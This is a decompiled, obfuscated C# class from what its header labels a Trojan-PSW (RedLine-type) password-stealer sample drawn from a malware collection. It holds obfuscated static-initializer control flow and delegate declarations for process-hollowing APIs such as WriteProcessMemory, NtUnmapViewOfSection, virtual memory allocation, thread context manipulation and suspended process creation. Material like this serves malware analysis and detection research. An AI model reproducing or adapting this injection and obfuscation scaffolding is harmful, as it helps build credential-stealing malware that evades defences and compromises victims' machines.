// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SheensVoidings, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FEFBC9C6-21E7-4888-AFDE-BD26521BFC24
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Reline.lxp-e5c444885808b5fcb13c40fb5d6c12013462113793988bf805c3b9f3b7f56ffb.exe

using \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0095;
using \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0098;
using \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0089\u009C;
using \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008A\u0089;
using \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u009E;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0095
{
  internal static class \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0094
  {
    public static object \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0096;
    internal static object \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u009E\u0099;

    [MethodImpl(MethodImplOptions.NoInlining)]
    static \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0094()
    {
      \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u009D.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008D\u0088();
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 1:
            \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008E.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008D(\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008E.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008F);
            num = \u003CModule\u003E\u007Bd92a3072\u002Df7db\u002D4913\u002D8ecd\u002D649e834ee249\u007D.m_fa77b61e5878482b9181e60f0a4785e9 != 0 ? 0 : 0;
            continue;
          case 2:
            \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008E.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008D(\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008E.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u0095);
            num = 4;
            continue;
          case 3:
            goto label_2;
          case 4:
            \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0094.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0096 = (object) \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u009A.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008D(1777642833 ^ 1777643351, \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u009A.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u009B);
            num = \u003CModule\u003E\u007Bd92a3072\u002Df7db\u002D4913\u002D8ecd\u002D649e834ee249\u007D.m_2fe90364aa054391b7bd30a3479768e2 != 0 ? 3 : 0;
            continue;
          default:
            \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008E.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008D(\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u008E.\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u008E\u0094);
            num = \u003CModule\u003E\u007Bd92a3072\u002Df7db\u002D4913\u002D8ecd\u002D649e834ee249\u007D.m_aad967b4ecf54fef818e4195eb42abb0 != 0 ? 2 : 2;
            continue;
        }
      }
label_2:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u009E\u009A() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0094 \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0087\u009E\u009B() => (\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0094) null;

    [return: MarshalAs(UnmanagedType.Bool)]
    internal delegate bool \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u008B(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess,
      [MarshalAs(UnmanagedType.Bool)] ref bool isWow64);

    internal delegate uint \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u008C(
      IntPtr ProcessHandle,
      IntPtr BaseAddress,
      IntPtr Buffer,
      uint NumberOfBytesToWrite,
      ref uint NumberOfBytesWritten);

    [return: MarshalAs(UnmanagedType.Bool)]
    internal delegate bool \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u008D(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess,
      [MarshalAs(UnmanagedType.I4)] int exitCode);

    [return: MarshalAs(UnmanagedType.Bool)]
    internal delegate bool \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u008E(
      IntPtr handle);

    [return: MarshalAs(UnmanagedType.Bool)]
    internal delegate bool \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u008F(
      [MarshalAs(UnmanagedType.U4)] uint hToken,
      [MarshalAs(UnmanagedType.LPTStr)] string lpApplicationName,
      [MarshalAs(UnmanagedType.LPTStr)] string lpCommandLine,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpProcessAttributes,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpThreadAttributes,
      [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles,
      [MarshalAs(UnmanagedType.U4)] uint dwCreationFlags,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpEnvironment,
      [MarshalAs(UnmanagedType.LPTStr)] string lpCurrentDirectory,
      [In] ref \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008A\u0088 lpStartupInfo,
      out \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0089\u009B lpProcessgnirtSretnuoCecnamrofrePscitsongaiDledoMecivreSmetsyS34639,
      [MarshalAs(UnmanagedType.U4)] uint hNewToken);

    internal unsafe delegate uint \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0090(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hThread,
      \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0097* pContext);

    internal unsafe delegate uint \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0091(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hThread,
      \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0088\u0097* pContext);

    internal delegate uint \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0092(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpBaseAddress);

    internal delegate uint \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0093(
      IntPtr ProcessHandle,
      ref IntPtr BaseAddress,
      uint ZeroBits,
      ref uint RegionSize,
      uint AllocationType,
      uint Protect);

    internal delegate uint \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0094(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hThread,
      ref uint count);

    internal delegate IntPtr \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0095();

    internal delegate bool \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0096(
      IntPtr hWnd,
      int nCmdShow);

    internal delegate void \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0097(
      IntPtr Destination,
      IntPtr Source,
      uint Length);

    internal delegate IntPtr \u0086\u0086\u0086\u0086\u0086\u0086\u0086\u0086\u008B\u0098(
      IntPtr mem);
  }
}
